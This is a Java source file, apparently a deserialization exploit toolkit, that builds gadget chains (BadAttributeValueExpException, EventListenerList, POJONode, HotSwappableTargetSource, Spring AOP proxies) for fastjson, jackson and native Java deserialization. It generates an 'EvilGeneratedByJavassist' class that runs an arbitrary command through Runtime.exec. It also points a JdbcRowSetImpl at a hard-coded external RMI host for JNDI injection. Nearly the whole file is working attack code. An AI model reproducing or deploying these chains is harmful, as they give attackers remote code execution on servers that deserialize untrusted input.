package unknown;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtNewConstructor;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.*;
import java.util.HashMap;
import java.util.Vector;


/*


readObject->toString
    javax.management.BadAttributeValueExpException(val)
    javax.swing.event.EventListenerList(obj)


toString->getter
    fastjson 版本2 也可: JSONObject或JSONArray
    jackson 2.13.2也可: POJONode


*/

public class Gadget {

    public static JdbcRowSetImpl getJdbcRowSetImpl(String url) throws Exception{
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        Util.setFieldValue(jdbcRowSet,"dataSource","rmi://101.200.148.123:11099/#Evil");
        return jdbcRowSet;
    }

    public static SignedObject getSingnedObject(Serializable obj) throws Exception{
        /*
            getObject()
                ->new ObjectInputStream(this.content).readObject()
        */

        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(obj,privateKey,signingEngine);

        return signedObject;
    }
    public static TemplatesImpl getTemplateImpl(byte[] code) throws Exception{
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field bytecodes = clazz.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        TemplatesImpl o = new TemplatesImpl();
        byte[][] b = new byte[][]{code};
        bytecodes.set(o, b);
        Field _name = clazz.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(o, "Hello");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(o, new TransformerFactoryImpl());
        Field _transletIndex = clazz.getDeclaredField("_transletIndex");
        _transletIndex.setAccessible(true);
        _transletIndex.set(o, 0);
        return o;
    }
    public static TemplatesImpl getTemplateImpl(String cmd) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilGeneratedByJavassist");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        //设置namesArray为了不报空指针
        CtConstructor ctConstructor = CtNewConstructor.make("" +
                "public EvilGeneratedByJavassist(){" +
                "this.namesArray=new String[1];" +
                "this.namesArray[0]=\"QWQ\";" +
                "Runtime.getRuntime().exec(\""+cmd+"\");\n}", ctClass);

        ctClass.addConstructor(ctConstructor);
        byte[] bytes0 = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        Util.setFieldValue(templates, "_bytecodes",new byte[][]{bytes0});
        Util.setFieldValue(templates, "_name", "name");
        Util.setFieldValue(templates, "_tfactory",new TransformerFactoryImpl());

        return templates;
    }


    public static HotSwappableTargetSource getHotSwappableTargetSource(Object obj){
        return new HotSwappableTargetSource(obj);
    }


    public static POJONode getPOJONode(Object val){
        return new POJONode(val);
    }
    public static Object getPOJONodeStableProxy(Templates templatesImpl) throws Exception{
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        return proxyObj;
    }
    /**
     * 运行时要加Javaagent参数
     */
    public static StyledEditorKit.AlignmentAction getAlignmentActionForToString(Object obj) throws Exception{
        StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction("nm",1);

        alignmentAction.putValue("11",new XString("123")); //xstring
        alignmentAction.putValue("22",obj); // obj.toString

        SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(new EventListenerList());

        Util.setFieldValue(alignmentAction,"changeSupport",swingPropertyChangeSupport);

        return alignmentAction;
    }

    public static StyledEditorKit.AlignmentAction getAlignmentActionForEquals(Object obj1,Object obj2) throws Exception{
        StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction("nm",1);

        alignmentAction.putValue("11",obj1); //xstring
        alignmentAction.putValue("22",obj2); // obj.toString

        SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(new EventListenerList());

        Util.setFieldValue(alignmentAction,"changeSupport",swingPropertyChangeSupport);

        return alignmentAction;
    }
    public static BadAttributeValueExpException getBadAttributeValueExpException(Object val) throws Exception{
        BadAttributeValueExpException bd = new BadAttributeValueExpException(1);
        Util.setFieldValue(bd,"val",val);
        return bd;
    }

    public static EventListenerList getEventListenerList(Object obj) throws Exception{
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector)Util.getFieldValue(manager, "edits");
        vector.add(obj);
        Util.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }


    public static HashMap get_HashMap_HotSwappable_XString(Object obj) throws Exception{
        XString xString = new XString("");
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(10);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(2);

        HashMap<Object, Object> map = new HashMap<>();
        map.put(h1,"123");
        map.put(h2,1);

        Util.setFieldValue(h1,"target",obj);
        Util.setFieldValue(h2,"target",xString);

        return map;
    }
    public static HashMap get_HashMap_XString(Object obj) throws Exception{
        XString xString = new XString("");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", xString);
        map1.put("zZ",obj);
        map2.put("zZ", xString);
        HashMap hashMap = new HashMap();
        hashMap.put(map1,1);
        hashMap.put(map2,2);
        map2.put("yy", obj);
        return hashMap;
    }





    public static void main(String[] args) throws Exception{

    }
}